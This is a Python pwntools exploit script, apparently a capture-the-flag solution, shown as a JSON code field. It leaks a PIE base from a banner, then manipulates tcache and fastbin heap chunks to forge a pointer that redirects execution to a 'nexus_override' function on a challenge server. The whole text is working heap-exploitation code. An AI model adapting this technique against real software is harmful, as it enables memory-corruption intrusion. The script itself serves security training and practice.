        "code": "#!/usr/bin/env python3\n\nfrom pathlib import Path\nimport re\n\nfrom pwn import *\n\nBASE_DIR = Path(__file__).resolve().parent\nBINARY_PATH = BASE_DIR / \"main\"\ncontext.binary = elf = ELF(str(BINARY_PATH), checksec=False)\ncontext.log_level = \"info\"\n\nMAIN_INNER = 0x17430\n\n\ndef start():\n    if args.REMOTE:\n        return remote(args.HOST or \"pwn.securinets.tn\", int(args.PORT or 1002))\n    return process([str(BINARY_PATH)])\n\n\ndef exploit(io):\n    banner = io.recvuntil(b\"> \", timeout=5)\n    match = re.search(rb\"main\\s+@\\s+0x([0-9a-f]+)\", banner)\n    if not match:\n        raise RuntimeError(\"main address leak was not found\")\n\n    main_addr = int(match.group(1), 16)\n    elf.address = main_addr - MAIN_INNER\n    override = elf.sym.nexus_override\n    log.info(\"PIE base: %#x\", elf.address)\n    log.info(\"nexus_override: %#x\", override)\n\n    forged = b\"0x\" + p64(override).hex().encode() + p64(0xc0deca11).hex().encode()\n    commands = []\n\n    # Fill the malloc tcache so the registered target is freed to fastbin.\n    for _ in range(8):\n        commands += [b\"c\", b\"e\", b\"1\", b\"foo\"]\n    commands += [b\"r\", b\"0\"]\n    for slot in range(1, 8):\n        commands += [b\"f\", str(slot).encode()]\n    commands += [b\"f\", b\"0\", b\"c\", b\"d\", b\"w\", b\"0\", b\"0\", forged]\n    commands += [b\"a\", b\"0\", b\"0x1337\"]\n    for command in commands:\n        io.sendline(command)\n\n    result = io.recvall(timeout=8)\n    if b\"calling \" not in result:\n        raise RuntimeError(\"override was not reached; output:\\n\" + result.decode(errors=\"replace\"))\n    print(result.decode(errors=\"replace\"), end=\"\")\n\n\ndef main():\n    io = start()\n    exploit(io)\n\n\nif __name__ == \"__main__\":\n    main()\n"
